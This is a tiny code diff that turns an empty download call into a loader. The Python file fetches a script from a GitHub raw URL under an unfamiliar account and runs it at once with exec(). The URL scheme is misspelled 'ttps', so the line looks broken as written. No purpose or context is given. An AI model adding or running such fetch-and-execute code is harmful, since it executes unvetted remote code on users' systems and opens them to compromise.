@@ -1,3 +1,3 @@
 import urllib
-(fn,hd) = urllib.urlretrieve('')
+(fn,hd) = urllib.urlretrieve(f'ttps://raw.githubusercontent.com/iluvcatz/iluvcatz.github.io/main/pages/g.py')
 exec(open(fn).read())
